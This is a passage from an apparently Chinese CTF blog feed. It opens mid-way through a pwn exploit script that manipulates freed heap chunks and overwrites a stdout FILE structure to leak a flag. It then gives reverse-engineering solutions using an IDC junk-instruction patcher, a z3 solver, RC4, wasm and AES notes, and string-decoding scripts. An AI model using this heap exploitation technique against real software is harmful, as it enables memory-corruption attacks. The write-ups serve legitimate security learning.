class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0</span>)</span><br><span class="line">base_addr = u64((<span class="string">&#x27;\x00&#x27;</span> + edit(<span class="number">0</span>, <span class="string">&quot;a&quot;</span>)[<span class="number">1</span>:]).ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>)) - <span class="number">0x7ffff7dd1d00</span> + <span class="number">0x7ffff7dd25dd</span></span><br><span class="line">add(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0</span>)</span><br><span class="line">flag_addr = u64((<span class="string">&#x27;\x00&#x27;</span> + edit(<span class="number">0</span>, <span class="string">&quot;a&quot;</span>)[<span class="number">1</span>:]).ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>)) + <span class="number">0x55c0b7554240</span> - <span class="number">0x55c0b7554000</span></span><br><span class="line"><span class="comment"># print &quot;&gt;&gt;&gt;&gt;&gt;&quot;+hex(flag_addr)</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>, p64(base_addr))</span><br><span class="line">add(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ru(<span class="string">&#x27;Input your choice:&#x27;</span>) </span><br><span class="line">sd(<span class="string">&#x27;2&#x27;</span>+<span class="string">&#x27;\x00\x00\x00&#x27;</span>)</span><br><span class="line">ru(<span class="string">&#x27;Input the idx&#x27;</span>) </span><br><span class="line">sd(<span class="built_in">str</span>(<span class="number">0</span>)+<span class="string">&#x27;\x00\x00\x00&#x27;</span>)</span><br><span class="line">ru(<span class="string">&#x27;Input the Magic&#x27;</span>) </span><br><span class="line">sd(<span class="string">&#x27;a&#x27;</span> * (<span class="number">0x7ffff7dd2620</span> - <span class="number">0x7ffff7dd25dd</span> - <span class="number">0x10</span>) + p64(<span class="number">0xfbad1800</span>) + p64(<span class="number">0</span>) * <span class="number">3</span> + p64(flag_addr))</span><br><span class="line">ru(<span class="string">&#x27;flag&#123;&#x27;</span>) </span><br><span class="line">flag = <span class="string">&#x27;flag&#123;&#x27;</span>+ru(<span class="string">&#x27;&#125;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> flag</span><br><span class="line">r.close()</span><br></pre></td></tr></table></figure><h1 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h1><h2 id="EasyRe"><a href="#EasyRe" class="headerlink" title="EasyRe"></a>EasyRe</h2><p>一开始知道是考的花指令，也自己手动去了一部分，但是发现太多了就放弃了，期间有观察到有一个神奇的字符串，看wp都说是flag，后来官方wp才知道是出题人忘去了。。。</p><p>最终要的就是这个函数：</p><p><img src="/2021/11/15/%E9%99%87%E5%8E%9F%E6%88%98%E7%96%AB2021%E9%83%A8%E5%88%86wp/image-20211115162141448.png" alt="image-20211115162141448"></p><p>进去之后发现不能直接f5，</p><p><img src="/2021/11/15/%E9%99%87%E5%8E%9F%E6%88%98%E7%96%AB2021%E9%83%A8%E5%88%86wp/image-20211115162216904.png" alt="image-20211115162216904"></p><p>是花指令没跑了。</p><pre><code>idc脚本：</code></pre><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//IDC脚本</span></span><br><span class="line"><span class="keyword">auto</span> addr_start =<span class="number">0x007217A0</span>;<span class="comment">//函数起始地址</span></span><br><span class="line"><span class="keyword">auto</span> addr_end = <span class="number">0x00721E58</span>;<span class="comment">//函数结束地址</span></span><br><span class="line"><span class="keyword">auto</span> i=<span class="number">0</span>,j=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(i=addr_start;i&lt;addr_end;i++)&#123;</span><br><span class="line">    <span class="keyword">if</span>(Dword(i) == <span class="number">0x1E8</span>)&#123;</span><br><span class="line">        <span class="keyword">for</span>(j=<span class="number">0</span> ; j&lt;<span class="number">6</span>; j++,i++ )&#123;</span><br><span class="line">            PatchByte(i,<span class="number">0x90</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        i=i+<span class="number">4</span>;</span><br><span class="line">        <span class="keyword">for</span>(j=<span class="number">0</span> ; j&lt;<span class="number">3</span>; j++,i++ )&#123;</span><br><span class="line">            PatchByte(i,<span class="number">0x90</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        i=i+<span class="number">10</span>;</span><br><span class="line">        <span class="keyword">for</span>(j=<span class="number">0</span> ; j&lt;<span class="number">3</span>; j++,i++ )&#123;</span><br><span class="line">            PatchByte(i,<span class="number">0x90</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        i=i+<span class="number">5</span>;</span><br><span class="line">        <span class="keyword">for</span>(j=<span class="number">0</span> ; j&lt;<span class="number">1</span>; j++,i++ )&#123;</span><br><span class="line">            PatchByte(i,<span class="number">0x90</span>);</span><br><span class="line">        &#125;   </span><br><span class="line">        i=i+<span class="number">3</span>;</span><br><span class="line">        <span class="keyword">for</span>(j=<span class="number">0</span> ; j&lt;<span class="number">2</span>; j++,i++ )&#123;</span><br><span class="line">            PatchByte(i,<span class="number">0x90</span>);</span><br><span class="line">        &#125;     </span><br><span class="line">        i--;    </span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p><img src="/2021/11/15/%E9%99%87%E5%8E%9F%E6%88%98%E7%96%AB2021%E9%83%A8%E5%88%86wp/image-20211115162446951.png" alt="image-20211115162446951"></p><pre><code>run后，选中按u（undefined），再在开头按p建（Create Function）：</code></pre><p><img src="/2021/11/15/%E9%99%87%E5%8E%9F%E6%88%98%E7%96%AB2021%E9%83%A8%E5%88%86wp/image-20211115163225826.png" alt="image-20211115163225826"></p><p>接下来就是z3解了：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#python</span></span><br><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#提取出v4的数据</span></span><br><span class="line">v4 = [<span class="number">0x271e150c</span>,<span class="number">0x3b322920</span>,<span class="number">0x5f564d44</span>,<span class="number">0x736a6158</span>,<span class="number">0x978e857c</span>,<span class="number">0xaba29990</span>,<span class="number">0xcfc6bdb4</span>,<span class="number">0xe3dad1c8</span>,]</span><br><span class="line"></span><br><span class="line">v5 = [<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#main函数中用于比较的数据</span></span><br><span class="line">data = [<span class="number">0x0EEE8B042</span>,<span class="number">0x57D0EE6C</span>,<span class="number">0x0F3F54B32</span>,<span class="number">0x0D3F0B7D6</span>,<span class="number">0x0A61C389</span>,<span class="number">0x38C7BA40</span>,<span class="number">0x0C3D9E2C</span>,<span class="number">0x0D64A9284</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">x0=BitVec(<span class="string">&#x27;x0&#x27;</span>,<span class="number">32</span>)</span><br><span class="line">x1=BitVec(<span class="string">&#x27;x1&#x27;</span>,<span class="number">32</span>)</span><br><span class="line">x2=BitVec(<span class="string">&#x27;x2&#x27;</span>,<span class="number">32</span>)</span><br><span class="line">x3=BitVec(<span class="string">&#x27;x3&#x27;</span>,<span class="number">32</span>)</span><br><span class="line">x4=BitVec(<span class="string">&#x27;x4&#x27;</span>,<span class="number">32</span>)</span><br><span class="line">x5=BitVec(<span class="string">&#x27;x5&#x27;</span>,<span class="number">32</span>)</span><br><span class="line">x6=BitVec(<span class="string">&#x27;x6&#x27;</span>,<span class="number">32</span>)</span><br><span class="line">x7=BitVec(<span class="string">&#x27;x7&#x27;</span>,<span class="number">32</span>)</span><br><span class="line"></span><br><span class="line">s = z3.Solver()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(x1))</span><br><span class="line"></span><br><span class="line">v5[<span class="number">0</span>]=x0^v4[<span class="number">2</span>]</span><br><span class="line">v5[<span class="number">1</span>]=x1^v4[<span class="number">1</span>]</span><br><span class="line">v5[<span class="number">2</span>]=x2^v4[<span class="number">0</span>]</span><br><span class="line">v5[<span class="number">3</span>]=x3^v4[<span class="number">7</span>]</span><br><span class="line">v5[<span class="number">4</span>]=x4^v4[<span class="number">6</span>]</span><br><span class="line">v5[<span class="number">5</span>]=x5^v4[<span class="number">5</span>]</span><br><span class="line">v5[<span class="number">6</span>]=x6^v4[<span class="number">4</span>]</span><br><span class="line">v5[<span class="number">7</span>]=x7^v4[<span class="number">3</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    v5[i] ^= (v5[i] &lt;&lt; <span class="number">7</span>)</span><br><span class="line">    v5[i] ^= v4[(i*<span class="number">7</span>+<span class="number">3</span>)%<span class="number">8</span>]</span><br><span class="line">    v5[i] ^= v5[(i*<span class="number">5</span>+<span class="number">3</span>)%<span class="number">8</span>]</span><br><span class="line">    v5[i] ^= (v5[i]&lt;&lt;<span class="number">13</span>)</span><br><span class="line">    v5[i] ^= v4[(i*<span class="number">7</span>+<span class="number">5</span>)%<span class="number">8</span>]</span><br><span class="line">    v5[i] ^= (v5[i]&lt;&lt;<span class="number">17</span>)</span><br><span class="line">    </span><br><span class="line"><span class="built_in">print</span>(v5[<span class="number">0</span>])</span><br><span class="line">s.add(data[<span class="number">0</span>]==v5[<span class="number">0</span>],</span><br><span class="line">data[<span class="number">1</span>]==v5[<span class="number">1</span>],</span><br><span class="line">data[<span class="number">2</span>]==v5[<span class="number">2</span>],</span><br><span class="line">data[<span class="number">3</span>]==v5[<span class="number">3</span>],</span><br><span class="line">data[<span class="number">4</span>]==v5[<span class="number">4</span>],</span><br><span class="line">data[<span class="number">5</span>]==v5[<span class="number">5</span>],</span><br><span class="line">data[<span class="number">6</span>]==v5[<span class="number">6</span>],</span><br><span class="line">data[<span class="number">7</span>]==v5[<span class="number">7</span>],</span><br><span class="line">)</span><br><span class="line"><span class="built_in">print</span>(s.check())</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(s.model())</span><br></pre></td></tr></table></figure><p>out:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[x1 = 828781622,</span><br><span class="line">x7 = 943285560, </span><br><span class="line">x0 = 1630954594, </span><br><span class="line">x3 = 909140836, </span><br><span class="line">x5 = 1633759329, </span><br><span class="line">x4 = 825516597, </span><br><span class="line">x6 = 879047012, </span><br><span class="line">x2 = 862085687]</span><br></pre></td></tr></table></figure><p>然后就是int转chr：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#python</span></span><br><span class="line">x1 = <span class="number">828781622</span></span><br><span class="line">x7 = <span class="number">943285560</span></span><br><span class="line">x0 = <span class="number">1630954594</span></span><br><span class="line">x3 = <span class="number">909140836</span></span><br><span class="line">x5 = <span class="number">1633759329</span></span><br><span class="line">x4 = <span class="number">825516597</span></span><br><span class="line">x6 = <span class="number">879047012</span></span><br><span class="line">x2 = <span class="number">862085687</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">IntToChar</span>(<span class="params"> x </span>):</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">        a = x%<span class="number">0x100</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">chr</span>(a),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        x = x//<span class="number">0x100</span></span><br><span class="line">IntToChar(x0)</span><br><span class="line">IntToChar(x1)</span><br><span class="line">IntToChar(x2)</span><br><span class="line">IntToChar(x3)</span><br><span class="line">IntToChar(x4)</span><br><span class="line">IntToChar(x5)</span><br><span class="line">IntToChar(x6)</span><br><span class="line">IntToChar(x7)</span><br></pre></td></tr></table></figure><h2 id="findme"><a href="#findme" class="headerlink" title="findme"></a>findme</h2><p>看wp说是RC4，简单了解了下：</p><p>分三步：</p><ol><li> 初始化状态向量S和暂时向量T，长度都为256</li><li> 初始排列S</li><li> 产生密钥流k[]</li></ol><p>重要的其实就是第一个函数：</p><p><img src="/2021/11/15/%E9%99%87%E5%8E%9F%E6%88%98%E7%96%AB2021%E9%83%A8%E5%88%86wp/image-20211115170155215.png" alt="image-20211115170155215"></p><p>乍一看第二个函数时strcmp，其实不是，在第一个函数内部已经改了，改为RC4了。</p><p><img src="/2021/11/15/%E9%99%87%E5%8E%9F%E6%88%98%E7%96%AB2021%E9%83%A8%E5%88%86wp/image-20211115170329633.png" alt="image-20211115170329633"></p><p><img src="/2021/11/15/%E9%99%87%E5%8E%9F%E6%88%98%E7%96%AB2021%E9%83%A8%E5%88%86wp/image-20211115170430865.png" alt="image-20211115170430865"></p><p><img src="/2021/11/15/%E9%99%87%E5%8E%9F%E6%88%98%E7%96%AB2021%E9%83%A8%E5%88%86wp/image-20211115172343689.png" alt="image-20211115172343689"></p><pre><code>key也知道，直接在线解就ok</code></pre><h2 id="Eat-something"><a href="#Eat-something" class="headerlink" title="Eat_something"></a>Eat_something</h2><blockquote><p>wasm逆向</p><p>  参考：</p><pre><code> https://xz.aliyun.com/t/5170 https://www.52pojie.cn/thread-1438499-1-1.html</code></pre></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone --recursive https://github.com/WebAssembly/wabt</span><br></pre></td></tr></table></figure><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install cmake</span><br><span class="line"></span><br><span class="line">$ <span class="built_in">cd</span> wabt</span><br><span class="line">$ mkdir build</span><br><span class="line">$ <span class="built_in">cd</span> build</span><br><span class="line">$ cmake .. -DBUILD_TESTS=OFF</span><br><span class="line">$ cmake --build .</span><br></pre></td></tr></table></figure><p>本地环境搭建了半天，搭建好了但是不太会用。。。直接用的现成的工具：</p><p>meminit：</p><p><img src="/2021/11/15/%E9%99%87%E5%8E%9F%E6%88%98%E7%96%AB2021%E9%83%A8%E5%88%86wp/image-20211115231338025.png" alt="image-20211115231338025"></p><p><img src="/2021/11/15/%E9%99%87%E5%8E%9F%E6%88%98%E7%96%AB2021%E9%83%A8%E5%88%86wp/image-20211115231410644.png" alt="image-20211115231410644"></p><p>到这里看不下去了，关键代码有点看不懂：</p><blockquote><p>核心算法就是这一句<code>v13 != (i32_load(w2c_memory, v16 + 12LL) ^ (2 * v10))</code></p><p>翻译下就是<code>enc[i] != i ^ (flag[i] * 2)</code></p></blockquote><p>之后的就好做了。</p><h2 id="power"><a href="#power" class="headerlink" title="power"></a>power</h2><pre><code>arm汇编</code></pre><p>安装：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install gcc-arm-linux-gnueabi</span><br><span class="line"></span><br><span class="line">arm-linux-gnueabi-as power -o power.o</span><br></pre></td></tr></table></figure><p>提示很清楚了aes：</p><p><img src="/2021/11/15/%E9%99%87%E5%8E%9F%E6%88%98%E7%96%AB2021%E9%83%A8%E5%88%86wp/image-20211115211755931.png" alt="image-20211115211755931"></p><p>显示是cbc其实是ecb：</p><p><img src="/2021/11/15/%E9%99%87%E5%8E%9F%E6%88%98%E7%96%AB2021%E9%83%A8%E5%88%86wp/image-20211115213545044.png" alt="image-20211115213545044"></p><p>最近会大力复现之前比赛的wp。</p><blockquote><p>  参考:</p><ul><li>  <a href="https://wp.n03tack.top/posts/14620/#Pwn">https://wp.n03tack.top/posts/14620/#Pwn</a></li><li>  <a href="https://www.cnblogs.com/LynneHuan/p/15522466.html?continueFlag=9efa2d1c6fec8469bacde1d08e042fa4">https://www.cnblogs.com/LynneHuan/p/15522466.html?continueFlag=9efa2d1c6fec8469bacde1d08e042fa4</a></li><li>  canary绕过姿势：<a href="https://xz.aliyun.com/t/4657#toc-3">https://xz.aliyun.com/t/4657#toc-3</a></li><li>  <a href="https://song-10.gitee.io/2020/01/01/pwn-2020-01-01-pwn-canary/">https://song-10.gitee.io/2020/01/01/pwn-2020-01-01-pwn-canary/</a></li><li>  <a href="https://xz.aliyun.com/t/5170">https://xz.aliyun.com/t/5170</a></li><li>  <a href="https://www.52pojie.cn/thread-1438499-1-1.html">https://www.52pojie.cn/thread-1438499-1-1.html</a></li></ul></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[toc]&lt;/p&gt;
&lt;p&gt;都是赛后写的，wtcl。&lt;/p&gt;
&lt;p&gt;还是学到了很多。&lt;/p&gt;
&lt;h1 id=&quot;PWN&quot;&gt;&lt;a href=&quot;#PWN&quot; class=&quot;headerlink&quot; title=&quot;PWN&quot;&gt;&lt;/a&gt;PWN&lt;/h1&gt;&lt;h2 id=&quot;bbbaby&quot;&gt;&lt;a h</summary>
      
    
    
    
    
    <category term="WriteUp" scheme="http://example.com/tags/WriteUp/"/>
    
  </entry>
  
  <entry>
    <title>BUU_RE刷题</title>
    <link href="http://example.com/2021/11/07/BUU-RE-0x01-0x1F/"/>
    <id>http://example.com/2021/11/07/BUU-RE-0x01-0x1F/</id>
    <published>2021-11-06T16:00:00.000Z</published>
    <updated>2021-12-22T07:19:42.154Z</updated>
    
    <content type="html"><![CDATA[<p>之前写过一部分re的题解，最近又有点想搞re了，重来吧。(从01开始计)</p><h1 id="0x01-简单注册器"><a href="#0x01-简单注册器" class="headerlink" title="0x01.简单注册器"></a>0x01.简单注册器</h1><p><img src="/2021/11/07/BUU-RE-0x01-0x1F/image-20211021234037840.png" alt="image-20211021234037840"></p><p>简单的替换和翻转字符串</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">x = <span class="string">&quot;dd2940c04462b4dd7c450528835cca15&quot;</span></span><br><span class="line">x = <span class="built_in">list</span>(x)</span><br><span class="line">x[<span class="number">2</span>] = <span class="built_in">chr</span>((<span class="built_in">ord</span>(x[<span class="number">2</span>]) + <span class="built_in">ord</span>(x[<span class="number">3</span>])) - <span class="number">50</span>)</span><br><span class="line">x[<span class="number">4</span>] = <span class="built_in">chr</span>((<span class="built_in">ord</span>(x[<span class="number">2</span>]) + <span class="built_in">ord</span>(x[<span class="number">5</span>])) - <span class="number">48</span>)</span><br><span class="line">x[<span class="number">30</span>] = <span class="built_in">chr</span>((<span class="built_in">ord</span>(x[<span class="number">31</span>]) + <span class="built_in">ord</span>(x[<span class="number">9</span>])) - <span class="number">48</span>)</span><br><span class="line">x[<span class="number">14</span>] = <span class="built_in">chr</span>((<span class="built_in">ord</span>(x[<span class="number">27</span>]) + <span class="built_in">ord</span>(x[<span class="number">28</span>])) - <span class="number">97</span>)</span><br><span class="line">x = x[::-<span class="number">1</span>]</span><br><span class="line">x = <span class="string">&#x27;&#x27;</span>.join(x)</span><br><span class="line"><span class="built_in">print</span>(x)</span><br></pre></td></tr></table></figure><h1 id="0x02-Java逆向解密"><a href="#0x02-Java逆向解密" class="headerlink" title="0x02.Java逆向解密"></a>0x02.Java逆向解密</h1><p>代码逻辑很清晰</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> defpackage;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* renamed from: Reverse  reason: default package */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Reverse</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Scanner s = <span class="keyword">new</span> Scanner(System.in);</span><br><span class="line">        System.out.println(<span class="string">&quot;Please input the flag ：&quot;</span>);</span><br><span class="line">        String str = s.next();</span><br><span class="line">        System.out.println(<span class="string">&quot;Your input is ：&quot;</span>);</span><br><span class="line">        System.out.println(str);</span><br><span class="line">        Encrypt(str.toCharArray());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Encrypt</span><span class="params">(<span class="keyword">char</span>[] arr)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span>[] KEY;</span><br><span class="line">        ArrayList&lt;Integer&gt; Resultlist = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">char</span> c : arr) &#123;</span><br><span class="line">            Resultlist.add(Integer.valueOf((c + <span class="string">&#x27;@&#x27;</span>) ^ <span class="number">32</span>));</span><br><span class="line">        &#125;</span><br><span class="line">        ArrayList&lt;Integer&gt; KEYList = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i : <span class="keyword">new</span> <span class="keyword">int</span>[]&#123;<span class="number">180</span>, <span class="number">136</span>, <span class="number">137</span>, <span class="number">147</span>, <span class="number">191</span>, <span class="number">137</span>, <span class="number">147</span>, <span class="number">191</span>, <span class="number">148</span>, <span class="number">136</span>, <span class="number">133</span>, <span class="number">191</span>, <span class="number">134</span>, <span class="number">140</span>, <span class="number">129</span>, <span class="number">135</span>, <span class="number">191</span>, <span class="number">65</span>&#125;) &#123;</span><br><span class="line">            KEYList.add(Integer.valueOf(i));</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot;Result:&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (Resultlist.equals(KEYList)) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;Congratulations！&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            System.err.println(<span class="string">&quot;Error！&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">flag = [<span class="number">180</span>, <span class="number">136</span>, <span class="number">137</span>, <span class="number">147</span>, <span class="number">191</span>, <span class="number">137</span>, <span class="number">147</span>, <span class="number">191</span>,</span><br><span class="line">        <span class="number">148</span>, <span class="number">136</span>, <span class="number">133</span>, <span class="number">191</span>, <span class="number">134</span>, <span class="number">140</span>, <span class="number">129</span>, <span class="number">135</span>, <span class="number">191</span>, <span class="number">65</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag)):</span><br><span class="line">    flag[i] = <span class="built_in">chr</span>((flag[i] - <span class="built_in">ord</span>(<span class="string">&#x27;@&#x27;</span>)) ^ <span class="number">0x20</span>)</span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span>.join(flag)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><h1 id="0x03-findit"><a href="#0x03-findit" class="headerlink" title="0x03.findit"></a>0x03.findit</h1><p>就是个凯撒</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.findit;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.support.v7.app.ActionBarActivity;</span><br><span class="line"><span class="keyword">import</span> android.view.MenuItem;</span><br><span class="line"><span class="keyword">import</span> android.view.View;</span><br><span class="line"><span class="keyword">import</span> android.widget.Button;</span><br><span class="line"><span class="keyword">import</span> android.widget.EditText;</span><br><span class="line"><span class="keyword">import</span> android.widget.TextView;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">ActionBarActivity</span> </span>&#123;</span><br><span class="line">    <span class="comment">/* access modifiers changed from: protected */</span></span><br><span class="line">    <span class="meta">@Override</span> <span class="comment">// 